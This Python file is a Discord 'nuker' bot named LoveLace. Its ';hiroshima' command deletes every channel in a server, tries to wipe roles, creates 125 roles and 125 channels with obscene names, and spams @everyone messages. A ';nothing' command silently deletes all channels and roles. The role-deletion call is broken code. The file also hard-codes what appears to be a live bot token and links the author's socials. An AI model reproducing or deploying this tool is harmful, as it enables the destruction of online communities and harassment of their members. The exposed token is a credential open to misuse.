import discord
from discord.ext import commands
import random
import colorama
from colorama import Fore, Back, Style, init
init()

TOKEN = "OTgxOTg2NzA1MDM0ODcwNzg2.GSM5V_.-pBTe0MaX3zHSKsHXdHkaCbLntASt5q9fntCb0"

client = commands.Bot(command_prefix = ";")
client.remove_command("help")

#discord bot's terminal
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left")

@client.command()
async def hiroshima(ctx):
    await ctx.send("**If you've never seen a massacre, this is what it looks like.**")
    guild = ctx.guild
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            print("  DELETING CHANNELS: FAILED")
    for role in list(ctx.guild.roles):
        try:
            await discord.role.delete() 
        except:
            print("  DELETING ROLES: FAILED")
    for _i in range(125):
        try:
            await ctx.guild.create_role(name="Fucked By LoveLace.")
        except:
            print("  CREATING ROLES: FAILED")
    for _i in range(125):
        await ctx.guild.create_text_channel(name="Fucked By LoveLace.")
    for channel in list(ctx.guild.channels):
        for _i in range(5):
            try:
                await channel.send("@everyone Server Just Got Fucked By Lovelace.")  
            except:
                print("  CREATING ROLES: FAILED")  

@client.command()
async def help(ctx):
    await ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**")
    await ctx.send("**-------------------------------------------------------------------------**")
    await ctx.send("**[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left**")

@client.command()
async def credits(ctx):
    await ctx.send("**Bot created by Transit Van#0393**")
    await ctx.send("**Get bot here: https://github.com/TransitVan**")

@client.command()
async def nothing(ctx):
        guild = ctx.guild
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                print("  DELETING CHANNELS: FAILED")
        for role in list(ctx.guild.roles):
            try:
                await discord.role.delete() 
            except:
                print("  DELETING ROLES: FAILED")

client.run(TOKEN)
